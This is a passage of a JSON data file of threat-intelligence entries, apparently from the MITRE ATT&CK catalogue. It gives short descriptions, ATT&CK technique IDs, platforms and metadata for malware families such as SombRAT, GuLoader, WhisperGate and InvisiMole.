        "T1070.003",
        "T1219",
        "T1140",
        "T1496.001",
        "T1136.001",
        "T1105",
        "T1552.005",
        "T1027.013",
        "T1543.002",
        "T1611",
        "T1068",
        "T1059.004"
      ],
      "platforms": [
        "Linux",
        "Containers",
        "IaaS"
      ],
      "url": "https://attack.mitre.org/software/S0601",
      "stix_id": "malware--40a1b8ec-7295-416c-a6b1-68181d86f120",
      "created": "2021-04-07T18:07:47.604000+00:00",
      "modified": "2024-04-11T02:18:41.342000+00:00"
    },
    "S0092": {
      "id": "S0092",
      "name": "Agent.btz",
      "description": "[Agent.btz](https://attack.mitre.org/software/S0092) is a worm that primarily spreads itself via removable devices such as USB drives. It reportedly infected U.S. military networks in 2008. (Citation: Securelist Agent.btz)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1033",
        "T1091",
        "T1052.001",
        "T1016",
        "T1560.003",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0092",
      "stix_id": "malware--40d3e230-ed32-469f-ba89-be70cc08ab39",
      "created": "2017-05-31T21:32:59.153000+00:00",
      "modified": "2025-04-25T14:43:05.955000+00:00"
    },
    "S0218": {
      "id": "S0218",
      "name": "SLOWDRIFT",
      "description": "[SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in South Korea. (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1102.002",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0218",
      "stix_id": "malware--414dc555-c79e-4b24-a2da-9b607f7eaf16",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.387000+00:00"
    },
    "S0217": {
      "id": "S0217",
      "name": "SHUTTERSPEED",
      "description": "[SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1105",
        "T1113"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0217",
      "stix_id": "malware--4189a679-72ed-4a89-a57c-7f689712ecf8",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.388000+00:00"
    },
    "S0615": {
      "id": "S0615",
      "name": "SombRAT",
      "description": "[SombRAT](https://attack.mitre.org/software/S0615) is a modular backdoor written in C++ that has been used since at least 2019 to download and execute malicious payloads, including [FIVEHANDS](https://attack.mitre.org/software/S0618) ransomware.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS May 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.002",
        "T1124",
        "T1057",
        "T1090",
        "T1140",
        "T1005",
        "T1106",
        "T1027",
        "T1070.004",
        "T1105",
        "T1095",
        "T1564.010",
        "T1033",
        "T1560.003",
        "T1573.001",
        "T1041",
        "T1071.004",
        "T1074.001",
        "T1568.002",
        "T1007",
        "T1055.001",
        "T1083",
        "T1036",
        "T1082"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0615",
      "stix_id": "malware--425771c5-48b4-4ecd-9f95-74ed3fc9da59",
      "created": "2021-05-26T13:13:43.366000+00:00",
      "modified": "2025-04-16T20:38:04+00:00"
    },
    "S1170": {
      "id": "S1170",
      "name": "ODAgent",
      "description": "[ODAgent](https://attack.mitre.org/software/S1170) is a C#/.NET downloader that has been used by [OilRig](https://attack.mitre.org/groups/G0049) since at least 2022 including against target organizations in Israel to download and execute payloads and to exfiltrate staged files.(Citation: ESET OilRig Downloaders DEC 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1567.002",
        "T1102.002",
        "T1059.003",
        "T1105",
        "T1106",
        "T1083",
        "T1041",
        "T1070.004",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1170",
      "stix_id": "malware--42bf4ce8-415f-40e3-98b3-e3811875b406",
      "created": "2024-11-26T18:49:37.827000+00:00",
      "modified": "2024-11-27T19:42:48.943000+00:00"
    },
    "S1181": {
      "id": "S1181",
      "name": "BlackByte 2.0 Ransomware",
      "description": "[BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) is a replacement for [BlackByte Ransomware](https://attack.mitre.org/software/S1180). Unlike [BlackByte Ransomware](https://attack.mitre.org/software/S1180), [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) does not have a common key for victim decryption. [BlackByte 2.0 Ransomware](https://attack.mitre.org/software/S1181) remains uniquely associated with [BlackByte](https://attack.mitre.org/groups/G1043) operations.(Citation: Microsoft BlackByte 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.006",
        "T1562.004",
        "T1112",
        "T1486",
        "T1490",
        "T1068",
        "T1135",
        "T1489",
        "T1070.004",
        "T1569.002",
        "T1055"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1181",
      "stix_id": "malware--42fdf9db-6005-4bb3-96f6-496b94ce519d",
      "created": "2024-12-17T01:09:17.837000+00:00",
      "modified": "2025-03-09T16:01:39.889000+00:00"
    },
    "S0383": {
      "id": "S0383",
      "name": "FlawedGrace",
      "description": "[FlawedGrace](https://attack.mitre.org/software/S0383) is a fully featured remote access tool (RAT) written in C++ that was first observed in late 2017.(Citation: Proofpoint TA505 Jan 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0383",
      "stix_id": "malware--43155329-3edf-47a6-9a14-7dac899b01e4",
      "created": "2019-05-29T14:33:04.253000+00:00",
      "modified": "2024-04-11T02:32:31.883000+00:00"
    },
    "S0036": {
      "id": "S0036",
      "name": "FLASHFLOOD",
      "description": "[FLASHFLOOD](https://attack.mitre.org/software/S0036) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1005",
        "T1547.001",
        "T1083",
        "T1025",
        "T1074.001",
        "T1560.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0036",
      "stix_id": "malware--43213480-78f7-4fb3-976f-d48f5f6a4c2a",
      "created": "2017-05-31T21:32:28.754000+00:00",
      "modified": "2024-11-17T15:05:25.105000+00:00"
    },
    "S0381": {
      "id": "S0381",
      "name": "FlawedAmmyy",
      "description": "[FlawedAmmyy](https://attack.mitre.org/software/S0381) is a remote access tool (RAT) that was first seen in early 2016. The code for [FlawedAmmyy](https://attack.mitre.org/software/S0381) was based on leaked source code for a version of Ammyy Admin, a remote access software.(Citation: Proofpoint TA505 Mar 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1082",
        "T1056.001",
        "T1033",
        "T1047",
        "T1547.001",
        "T1059.001",
        "T1518.001",
        "T1218.011",
        "T1120",
        "T1071.001",
        "T1041",
        "T1113",
        "T1105",
        "T1056",
        "T1573.001",
        "T1005",
        "T1115",
        "T1001",
        "T1218.007",
        "T1070.004",
        "T1069.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0381",
      "stix_id": "malware--432555de-63bf-4f2a-a3fa-f720a4561078",
      "created": "2019-05-28T19:07:29.816000+00:00",
      "modified": "2025-04-16T20:38:04.147000+00:00"
    },
    "S1086": {
      "id": "S1086",
      "name": "Snip3",
      "description": "[Snip3](https://attack.mitre.org/software/S1086) is a sophisticated crypter-as-a-service that has been used since at least 2021 to obfuscate and load numerous strains of malware including [AsyncRAT](https://attack.mitre.org/software/S1087), [Revenge RAT](https://attack.mitre.org/software/S0379), [Agent Tesla](https://attack.mitre.org/software/S0331), and [NETWIRE](https://attack.mitre.org/software/S0198).(Citation: Morphisec Snip3 May 2021)(Citation: Telefonica Snip3 December 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1102",
        "T1059.005",
        "T1055.012",
        "T1027",
        "T1547.001",
        "T1204.002",
        "T1082",
        "T1204.001",
        "T1566.001",
        "T1497.003",
        "T1047",
        "T1104",
        "T1105",
        "T1566.002",
        "T1189",
        "T1497.001",
        "T1564.003",
        "T1027.001",
        "T1059.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1086",
      "stix_id": "malware--4327aff5-f194-440c-b499-4d9730cc1eab",
      "created": "2023-09-13T18:52:15.552000+00:00",
      "modified": "2023-10-10T17:18:52.857000+00:00"
    },
    "S0628": {
      "id": "S0628",
      "name": "FYAnti",
      "description": "[FYAnti](https://attack.mitre.org/software/S0628) is a loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2020, including to deploy [QuasarRAT](https://attack.mitre.org/software/S0262).(Citation: Securelist APT10 March 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1083",
        "T1140",
        "T1027.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0628",
      "stix_id": "malware--434ba392-ebdc-488b-b1ef-518deea65774",
      "created": "2021-06-22T14:20:30.164000+00:00",
      "modified": "2025-04-25T14:43:07.972000+00:00"
    },
    "S0433": {
      "id": "S0433",
      "name": "Rifdoor",
      "description": "[Rifdoor](https://attack.mitre.org/software/S0433) is a remote access trojan (RAT) that shares numerous code similarities with [HotCroissant](https://attack.mitre.org/software/S0431).(Citation: Carbon Black HotCroissant April 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1082",
        "T1027.001",
        "T1016",
        "T1547.001",
        "T1566.001",
        "T1573.001",
        "T1033",
        "T1204.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0433",
      "stix_id": "malware--44c75271-0e4d-496f-ae0a-a6d883a42a65",
      "created": "2020-05-05T14:03:11.359000+00:00",
      "modified": "2024-04-11T00:14:59.199000+00:00"
    },
    "S1049": {
      "id": "S1049",
      "name": "SUGARUSH",
      "description": "[SUGARUSH](https://attack.mitre.org/software/S1049) is a small custom backdoor that can establish a reverse shell over TCP to a hard coded C2 address. [SUGARUSH](https://attack.mitre.org/software/S1049) was first identified during analysis of UNC3890's [C0010](https://attack.mitre.org/campaigns/C0010) campaign targeting Israeli companies, which began in late 2020.(Citation: Mandiant UNC3890 Aug 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1571",
        "T1016.001",
        "T1543.003",
        "T1059.003",
        "T1095"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1049",
      "stix_id": "malware--44e2a842-415b-47f4-8549-83fbdb8a5674",
      "created": "2022-10-04T21:48:00.086000+00:00",
      "modified": "2025-04-16T20:38:04.465000+00:00"
    },
    "S1101": {
      "id": "S1101",
      "name": "LoFiSe",
      "description": "[LoFiSe](https://attack.mitre.org/software/S1101) has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) since at least 2023 to identify and collect files of interest on targeted systems.(Citation: Kaspersky ToddyCat Check Logs October 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1560",
        "T1083",
        "T1574.001",
        "T1074.001",
        "T1005",
        "T1119"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1101",
      "stix_id": "malware--452da2d9-706c-4185-ad6f-f5edaf4b9f48",
      "created": "2024-01-19T21:08:29.427000+00:00",
      "modified": "2024-01-19T21:09:35.017000+00:00"
    },
    "S0376": {
      "id": "S0376",
      "name": "HOPLIGHT",
      "description": "[HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1652",
        "T1112",
        "T1008",
        "T1012",
        "T1090",
        "T1571",
        "T1550.002",
        "T1083",
        "T1003.002",
        "T1059.003",
        "T1041",
        "T1132.001",
        "T1082",
        "T1546.003",
        "T1569.002",
        "T1105",
        "T1047",
        "T1562.004",
        "T1124",
        "T1055"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0376",
      "stix_id": "malware--454fe82d-6fd2-4ac6-91ab-28a33fe01369",
      "created": "2019-04-19T15:30:36.593000+00:00",
      "modified": "2024-02-09T19:24:50.164000+00:00"
    },
    "S1153": {
      "id": "S1153",
      "name": "Cuckoo Stealer",
      "description": "[Cuckoo Stealer](https://attack.mitre.org/software/S1153) is a macOS malware with characteristics of spyware and an infostealer that has been in use since at least 2024. [Cuckoo Stealer](https://attack.mitre.org/software/S1153) is a universal Mach-O binary that can run on Intel or ARM-based Macs and has been spread through trojanized versions of various potentially unwanted programs or PUP's such as converters, cleaners, and uninstallers.(Citation: Kandji Cuckoo April 2024)(Citation: SentinelOne Cuckoo Stealer May 2024)\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.013",
        "T1564.001",
        "T1614.001",
        "T1033",
        "T1614",
        "T1569.001",
        "T1518",
        "T1647",
        "T1113",
        "T1074.001",
        "T1057",
        "T1083",
        "T1027.008",
        "T1140",
        "T1041",
        "T1036.005",
        "T1071.001",
        "T1059.004",
        "T1095",
        "T1553.001",
        "T1543.001",
        "T1059.002",
        "T1555.001",
        "T1082",
        "T1056.002",
        "T1217"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S1153",
      "stix_id": "malware--457a5e8d-d964-4130-bde3-c07bb41a093e",
      "created": "2024-08-20T19:39:35.337000+00:00",
      "modified": "2024-10-28T16:22:59.359000+00:00"
    },
    "S0561": {
      "id": "S0561",
      "name": "GuLoader",
      "description": "[GuLoader](https://attack.mitre.org/software/S0561) is a file downloader that has been used since at least December 2019 to distribute a variety of remote administration tool (RAT) malware, including [NETWIRE](https://attack.mitre.org/software/S0198), [Agent Tesla](https://attack.mitre.org/software/S0331), [NanoCore](https://attack.mitre.org/software/S0336), FormBook, and Parallax RAT.(Citation: Unit 42 NETWIRE April 2020)(Citation: Medium Eli Salem GuLoader April 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1566.002",
        "T1055",
        "T1497.001",
        "T1106",
        "T1070.004",
        "T1105",
        "T1071.001",
        "T1204.001",
        "T1102",
        "T1547.001",
        "T1497.003",
        "T1204.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0561",
      "stix_id": "malware--45c759ac-b490-48bb-80d4-c8eee3431027",
      "created": "2021-01-11T20:49:20.832000+00:00",
      "modified": "2025-04-25T14:43:09.227000+00:00"
    },
    "S0079": {
      "id": "S0079",
      "name": "MobileOrder",
      "description": "[MobileOrder](https://attack.mitre.org/software/S0079) is a Trojan intended to compromise Android mobile devices. It has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). (Citation: Scarlet Mimic Jan 2016)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1041",
        "T1105",
        "T1005",
        "T1057",
        "T1082",
        "T1083",
        "T1217"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0079",
      "stix_id": "malware--463f68f1-5cde-4dc2-a831-68b73488f8f4",
      "created": "2017-05-31T21:32:53.681000+00:00",
      "modified": "2025-04-25T14:43:09.588000+00:00"
    },
    "S0612": {
      "id": "S0612",
      "name": "WastedLocker",
      "description": "[WastedLocker](https://attack.mitre.org/software/S0612) is a ransomware family attributed to [Indrik Spider](https://attack.mitre.org/groups/G0119) that has been used since at least May 2020. [WastedLocker](https://attack.mitre.org/software/S0612) has been used against a broad variety of sectors, including manufacturing, information technology, and media.(Citation: Symantec WastedLocker June 2020)(Citation: NCC Group WastedLocker June 2020)(Citation: Sentinel Labs WastedLocker July 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1543.003",
        "T1564.001",
        "T1490",
        "T1112",
        "T1497.001",
        "T1486",
        "T1059.003",
        "T1548.002",
        "T1012",
        "T1027.016",
        "T1120",
        "T1106",
        "T1574.001",
        "T1083",
        "T1564.004",
        "T1135",
        "T1140",
        "T1569.002",
        "T1027.013",
        "T1222.001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0612",
      "stix_id": "malware--46cbafbc-8907-42d3-9002-5327c26f8927",
      "created": "2021-05-20T17:44:26.582000+00:00",
      "modified": "2024-03-25T19:46:59.150000+00:00"
    },
    "S0511": {
      "id": "S0511",
      "name": "RegDuke",
      "description": "[RegDuke](https://attack.mitre.org/software/S0511) is a first stage implant written in .NET and used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2017. [RegDuke](https://attack.mitre.org/software/S0511) has been used to control a compromised machine when control of other implants on the machine was lost.(Citation: ESET Dukes October 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1105",
        "T1027.003",
        "T1546.003",
        "T1059.001",
        "T1112",
        "T1140",
        "T1027.011",
        "T1102.002",
        "T1027"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0511",
      "stix_id": "malware--47124daf-44be-4530-9c63-038bc64318dd",
      "created": "2020-09-23T18:04:24.998000+00:00",
      "modified": "2025-04-16T20:38:04.977000+00:00"
    },
    "S0654": {
      "id": "S0654",
      "name": "ProLock",
      "description": "[ProLock](https://attack.mitre.org/software/S0654) is a ransomware strain that has been used in Big Game Hunting (BGH) operations since at least 2020, often obtaining initial access with [QakBot](https://attack.mitre.org/software/S0650). [ProLock](https://attack.mitre.org/software/S0654) is the successor to PwndLocker ransomware which was found to contain a bug allowing decryption without ransom payment in 2019.(Citation: Group IB Ransomware September 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1486",
        "T1047",
        "T1197",
        "T1027.003",
        "T1068",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0654",
      "stix_id": "malware--471d0e9f-2c8a-4e4b-8f3b-f85d2407806e",
      "created": "2021-09-30T19:47:47.136000+00:00",
      "modified": "2024-11-17T23:58:37.273000+00:00"
    },
    "S1137": {
      "id": "S1137",
      "name": "Moneybird",
      "description": "[Moneybird](https://attack.mitre.org/software/S1137) is a ransomware variant written in C++ associated with [Agrius](https://attack.mitre.org/groups/G1030) operations. The name \"Moneybird\" is contained in the malware's ransom note and as strings in the executable.(Citation: CheckPoint Agrius 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1027.009",
        "T1486"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1137",
      "stix_id": "malware--47ab6350-054f-4754-ba4d-e52a4e8751e2",
      "created": "2024-05-22T23:05:34.895000+00:00",
      "modified": "2024-08-29T15:19:39.017000+00:00"
    },
    "S0260": {
      "id": "S0260",
      "name": "InvisiMole",
      "description": "[InvisiMole](https://attack.mitre.org/software/S0260) is a modular spyware program that has been used by the InvisiMole Group since at least 2013. [InvisiMole](https://attack.mitre.org/software/S0260) has two backdoor modules called RC2FM and RC2CL that are used to perform post-exploitation activities. It has been discovered on compromised victims in the Ukraine and Russia. [Gamaredon Group](https://attack.mitre.org/groups/G0047) infrastructure has been used to download and execute [InvisiMole](https://attack.mitre.org/software/S0260) against a small number of victims.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1025",
        "T1218.011",
        "T1490",
        "T1055.002",
        "T1497.001",
        "T1562.004",
        "T1569.002",
        "T1070.004",
        "T1008",
        "T1559.001",
        "T1547.001",
        "T1055.004",
        "T1095",
        "T1560.002",
        "T1560.001",
        "T1113",
        "T1010",
        "T1056.001",
        "T1033",
        "T1074.001",
        "T1005",
        "T1564.001",
        "T1068",
        "T1132.002",
        "T1112",
        "T1218.002",
        "T1059.007",
        "T1007",
        "T1016",
        "T1480.001",
        "T1055.015",
        "T1090.001",
        "T1055",
        "T1082",
        "T1059.003",
        "T1543.003",
        "T1071.004",
        "T1027",
        "T1123",
        "T1210",
        "T1087.001",
        "T1083",
        "T1518",
        "T1560.003",
        "T1070.006",
        "T1140",
        "T1105",
        "T1001.003",
        "T1070.005",
        "T1119",
        "T1548.002",
        "T1564.003",
        "T1080",
        "T1125",
        "T1518.001",
        "T1547.009",
        "T1574.001",
        "T1046",
        "T1204.002",
        "T1124",
        "T1053.005",
        "T1071.001",
        "T1135",
        "T1090.002",
        "T1057",
        "T1036.004",
        "T1027.005",
        "T1203",
        "T1036.005",
        "T1106",
        "T1012"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0260",
      "stix_id": "malware--47afe41c-4c08-485e-b062-c3bd209a1cce",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:10.665000+00:00"
    },
    "S0598": {
      "id": "S0598",
      "name": "P.A.S. Webshell",
      "description": "[P.A.S. Webshell](https://attack.mitre.org/software/S0598) is a publicly available multifunctional PHP webshell in use since at least 2016 that provides remote access and execution on target web servers.(Citation: ANSSI Sandworm January 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1083",
        "T1505.003",
        "T1005",
        "T1222.002",
        "T1071.001",
        "T1059",
        "T1518",
        "T1027",
        "T1070.004",
        "T1046",
        "T1213",
        "T1110.001",
        "T1105",
        "T1087.001"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0598",
      "stix_id": "malware--4800d0f9-00aa-47cd-a4d2-92198585b8fd",
      "created": "2021-04-13T12:46:58.579000+00:00",
      "modified": "2025-04-25T14:43:11.044000+00:00"
    },
    "S1084": {
      "id": "S1084",
      "name": "QUIETEXIT",
      "description": "[QUIETEXIT](https://attack.mitre.org/software/S1084) is a novel backdoor, based on the open-source Dropbear SSH client-server software, that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021. [APT29](https://attack.mitre.org/groups/G0016) has deployed [QUIETEXIT](https://attack.mitre.org/software/S1084) on opaque network appliances that typically don't support antivirus or endpoint detection and response tools within a victim environment.(Citation: Mandiant APT29 Eye Spy Email Nov 22)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.002",
        "T1008",
        "T1095",
        "T1071",
        "T1036.005"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1084",
      "stix_id": "malware--4816d361-f82b-4a18-aa05-b215e7cf9200",
      "created": "2023-08-17T17:06:19.976000+00:00",
      "modified": "2025-04-15T19:46:34.040000+00:00"
    },
    "S0205": {
      "id": "S0205",
      "name": "Naid",
      "description": "[Naid](https://attack.mitre.org/software/S0205) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Naid June 2012)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1082",
        "T1112",
        "T1543.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0205",
      "stix_id": "malware--48523614-309e-43bf-a2b8-705c2b45d7b2",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T19:55:07.588000+00:00"
    },
    "S1133": {
      "id": "S1133",
      "name": "Apostle",
      "description": "[Apostle](https://attack.mitre.org/software/S1133) is malware that has functioned as both a wiper and, in more recent versions, as ransomware.  [Apostle](https://attack.mitre.org/software/S1133) is written in .NET and shares various programming and functional overlaps with [IPsec Helper](https://attack.mitre.org/software/S1132).(Citation: SentinelOne Agrius 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1529",
        "T1480",
        "T1070.001",
        "T1053.005",
        "T1561.001",
        "T1486",
        "T1485",
        "T1070.004",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1133",
      "stix_id": "malware--48d96fa0-d027-45aa-a8c3-5d09f65d596d",
      "created": "2024-05-22T19:16:58.646000+00:00",
      "modified": "2024-08-29T15:21:36.079000+00:00"
    },
    "S0180": {
      "id": "S0180",
      "name": "Volgmer",
      "description": "[Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1083",
        "T1543.003",
        "T1012",
        "T1082",
        "T1106",
        "T1573.001",
        "T1007",
        "T1105",
        "T1057",
        "T1016",
        "T1059.003",
        "T1573.002",
        "T1027.011",
        "T1112",
        "T1036.004",
        "T1027.013",
        "T1049",
        "T1070.004",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0180",
      "stix_id": "malware--495b6cdb-7b5a-4fbc-8d33-e7ef68806d08",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2024-04-10T22:16:05.440000+00:00"
    },
    "S0219": {
      "id": "S0219",
      "name": "WINERACK",
      "description": "[WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1033",
        "T1083",
        "T1010",
        "T1059",
        "T1007",
        "T1082"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0219",
      "stix_id": "malware--49abab73-3c5c-476e-afd5-69b5c732d845",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-11-17T15:01:33.388000+00:00"
    },
    "S0689": {
      "id": "S0689",
      "name": "WhisperGate",
      "description": "[WhisperGate](https://attack.mitre.org/software/S0689) is a multi-stage wiper designed to look like ransomware that has been used against multiple government, non-profit, and information technology organizations in Ukraine since at least January 2022.(Citation: Cybereason WhisperGate February 2022)(Citation: Unit 42 WhisperGate January 2022)(Citation: Microsoft WhisperGate January 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1542.003",
        "T1620",
        "T1485",
        "T1083",
        "T1059.001",
        "T1562.001",
        "T1218.004",
        "T1027.013",
        "T1106",
        "T1071.001",
        "T1070.004",
        "T1561.002",
        "T1561.001",
        "T1497.001",
        "T1518.001",
        "T1135",
        "T1569.002",
        "T1529",
        "T1055.012",
        "T1059.003",
        "T1059.005",
        "T1134.002",
        "T1102",
        "T1082",
        "T1497.003",
        "T1140",
        "T1036",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0689",
      "stix_id": "malware--49fee0b0-390e-4bde-97f8-97ed46bd19b7",
      "created": "2022-03-10T16:42:36.137000+00:00",
      "modified": "2024-04-10T22:13:49.349000+00:00"
    },
    "S0277": {
      "id": "S0277",
      "name": "FruitFly",
      "description": "FruitFly is designed to spy on mac users  (Citation: objsee mac malware 2017).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1057",
        "T1070.004",
        "T1113",
        "T1027.010",
        "T1564.001",
        "T1083",
        "T1543.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0277",
      "stix_id": "malware--4a98e44a-bd52-461e-af1e-a4457de87a36",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-16T20:38:05.463000+00:00"
    },
    "S0230": {
      "id": "S0230",
      "name": "ZeroT",
      "description": "[ZeroT](https://attack.mitre.org/software/S0230) is a Trojan used by [TA459](https://attack.mitre.org/groups/G0062), often in conjunction with [PlugX](https://attack.mitre.org/software/S0013). (Citation: Proofpoint TA459 April 2017) (Citation: Proofpoint ZeroT Feb 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1548.002",
        "T1543.003",
        "T1027.016",
        "T1574.001",
        "T1016",
        "T1082",
        "T1001.002",
        "T1071.001",
        "T1027.002",
        "T1105",
        "T1573.001",
        "T1027.013"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0230",
      "stix_id": "malware--4ab44516-ad75-4e43-a280-705dc0420e2f",
      "created": "2018-04-18T17:59:24.739000+00:00",
      "modified": "2024-04-10T20:32:14.510000+00:00"
    },
    "S0276": {
      "id": "S0276",
      "name": "Keydnap",
      "description": "This piece of malware steals the content of the user's keychain while maintaining a permanent backdoor  (Citation: OSX Keydnap malware).",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1090.003",
        "T1071.001",
        "T1555.002",
        "T1564.009",
        "T1548.001",
        "T1056.002",
        "T1036.006",
        "T1059.006",
        "T1543.001"
      ],
      "platforms": [
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0276",
      "stix_id": "malware--4b072c90-bc7a-432b-940e-016fc1c01761",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-01-10T15:18:40.400000+00:00"
    },
    "S1167": {
      "id": "S1167",
      "name": "AcidPour",
